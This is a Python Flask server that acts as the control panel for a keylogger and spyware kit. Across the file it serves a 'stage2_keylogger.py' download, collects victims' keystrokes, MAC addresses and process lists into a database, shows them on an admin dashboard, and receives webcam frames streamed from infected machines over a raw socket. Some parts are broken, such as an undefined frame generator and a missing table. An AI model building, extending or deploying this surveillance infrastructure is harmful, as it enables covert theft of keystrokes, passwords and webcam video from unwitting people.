#!/usr/bin/python3
import socket
import threading
import struct
import pickle
from flask import Flask, request, render_template, session, Response, redirect
import sqlite3
from datetime import date
from datetime import datetime
from pytz import timezone
import os
from flask import send_file
from helpers import login_required
from werkzeug.security import check_password_hash
app = Flask(__name__)
app.secret_key = 'my secret'
status1 = '0'
frame = None

@app.route("/index/log", methods = ["POST"])
@login_required
def funk6():
    if request.method == "POST":
         macid = request.form.get("mac")
         print(macid)
         data = []
         conn = sqlite3.connect("dope.db")
         c = conn.cursor()
        #  c.execute('select * from data where mac = ? LIMIT 100 order by time DESC', (macid,))
         c.execute('SELECT * FROM data WHERE pcname = ? ORDER BY time DESC ', (macid,))

         rows = c.fetchall()
         c.execute('SELECT * FROM pslist WHERE pcname = ?', (macid,)) 
         prcsinfo = c.fetchone()
         for row in rows:
              temp = []
              temp.append(row[2])
              temp.append(row[3])
              data.append(temp)
         prcsinfo1 = prcsinfo[1]
         import ast
         newlist1 = ast.literal_eval(prcsinfo1)

         for item in newlist1:
             seconds = item[2]
             days = int(seconds // 86400)
             hours = int(seconds // 3600 % 24)
             minutes = int(seconds // 60 % 60)
             sec = int(seconds % 60)
             item[2] = str(days) +'D ' + str(hours) + ':' + str(minutes) + ':' + str(sec)  
         print('printing newlist1')   
         print(newlist1)
         return render_template("log.html", data = data, processinfo = newlist1, lastupdated = prcsinfo[2])
@app.route("/dwfile")
def funkdw():
    path = 'Path to stage2_keylogger.py'
    return send_file(path, as_attachment=True)
@app.route("/index", methods = ["GET"])
@login_required
def funk5():
    data = []
    conn = sqlite3.connect("dope.db")
    c = conn.cursor()
    c.execute('select distinct pcname, mac from data')
    rows = c.fetchall()
    for row in rows:
         temp = []
         temp.append(row[0])
         temp.append(row[1])
         data.append(temp)
    return render_template('index.html', data = data)
     

@app.route("/logout", methods = ["GET"])
def funk4():
     session.clear()
     return redirect("/login")
@app.route("/login", methods= ["GET", "POST"])
def funk3():
     if request.method == "POST":
          username = 'lol'
          password1 = 'lol'
          try:
               username = request.form.get("username")
               password1 = request.form.get("password")
          except:
               pass
          conn = sqlite3.connect("dope.db")
          c = conn.cursor()
          c.execute('''Create table if not exists data (pcname text, mac text , data text, time text) ''')
          c.execute('''create table if not exists admin_users(username text primary key, hash text required)''')
          c.execute('select * from admin_users where username = ?', (username,))
          rows = c.fetchall()
          if len(rows) != 1:
               print('wrong username')
               return "Wrong username"
          for row in rows:
              result = (check_password_hash(pwhash=row[1], password=password1))
              if result == True:
                   session['id'] = username
                   return redirect("/index")
              return "wrong password"
     auth = request.authorization
    #  env_password = os.environ.get('PASSWORD')
    #  env_username = os.environ.get('USERNAME')
     if not auth or auth.username != 'YOUR_USERNAME_GOES_INSIDE_THESE_INVERTED_COMMAS' or auth.password != 'YOUR_PASSWORD_GOES_HERE':
         return Response('Could not verify your credentials', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
     return render_template("loginPage.html")

@app.route("/", methods = ["GET"])
def funk0():
    return render_template("downloadpage.html")

@app.route("/send",methods=["POST"])
def funk1():
    data = request.get_json()       
    username = data.get('username')
    key = data.get('key')
    mac1 = data.get('mac')
    string1 = data.get('string')
    processlist = data.get('processlist')
    #print(type(processlist))
    #print(processlist)
    if True: 
        current_time = datetime.now(timezone('Asia/Kolkata'))
        conn = sqlite3.connect("dope.db")
        c = conn.cursor()
        c.execute('insert or ignore into data(pcname,mac, data, time) values (?,?,?,?)',(username+mac1,mac1,string1,datetime.now(timezone('Asia/Kolkata'))))
        c.execute('insert or ignore into pslist(pcname, prcslist,lastupdated) values(?,?,?)',(username+mac1,processlist,datetime.now(timezone('Asia/Kolkata'))))
        c.execute('update pslist set prcslist = ?, lastupdated = ? WHERE pcname = ?',(processlist, current_time, username+mac1))
        #c.execute('IF EXISTS (SELECT * FROM pslist WHERE pcname = ?) THEN UPDATE pslist SET prcslist = ?, lastupdated = ? WHERE pcname = ? ELSE  INSERT OR IGNORE INTO pslist (pcname, prcslist, lastupdated) VALUES (?,?,?)',(username+mac1, processlist, current_time, username+mac1, username+mac1, processlist, current_time))
        print('data committedd to databases adding keystrokes and pslist')
        conn.commit()

        conn.close()
        return "done"
    else:
        return "fail"
    file.close()
@app.route("/recieve",methods=["POST"])
def funk2(key,username):
    conn = sqlite3.connect("dope.db")
    c = conn.cursor()
    cursor = c.execute('select * from data where username = ?',(username))
    dict['pcname']= username 
    data = []
    for row in cursor :
        time=[]
        time.append(row[2])
        time.append(row[1])
        data.append(time)
    return data


@app.route('/cammic', methods = ['GET', 'POST'])
def tatata():
    return "hello cutie"


@app.route('/cammic/command', methods=['GET', 'POST'])
def send_command():
    if request.method == 'GET':
        global status1
        command1 = '1'
        if command1 == '1' and status1 == '0':
            status1 = '1'
            print('calling the receiving function')
            receiver_thread = threading.Thread(target=receive_streaming)
            receiver_thread.start()
            print('returning 1')
            print(command1)
        elif command1 == '0':
            receiver_thread.join()
    return '1'

def receive_streaming():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = socket.gethostbyname(socket.gethostname())
    print('HOST IP:', host_ip)
    port = 5001
    socket_address = (host_ip, port)
    print('Socket created')

    # Bind the socket to the host.
    server_socket.bind(socket_address)
    print('Socket bind complete')

    # Listen for incoming connections.
    server_socket.listen(1)
    print('Socket now listening')

    while True:
        client_socket, addr = server_socket.accept()
        print('Connection from:', addr)
        if client_socket:
            data = b""
            payload_size = struct.calcsize("Q")
            while True:
                while len(data) < payload_size:
                    packet = client_socket.recv(4 * 1024)
                    if not packet:
                        break
                    data += packet
                if not packet:
                    break
                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                try:
                    msg_size = struct.unpack("Q", packed_msg_size)[0]
                except:
                    pass
                while len(data) < msg_size:
                    data += client_socket.recv(4 * 1024)

                frame_data = data[:msg_size]
                data = data[msg_size:]
                global frame
                frame = pickle.loads(frame_data)
        print("exiting")


@app.route('/cammic/index', methods=['GET'])
def index():
    return Response(generate_frame(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/cammic/vid_feed', methods =['GET','POST'])
def vid_feed():
    return render_template('index1.html')


if __name__ == "__main__":
	app.run()
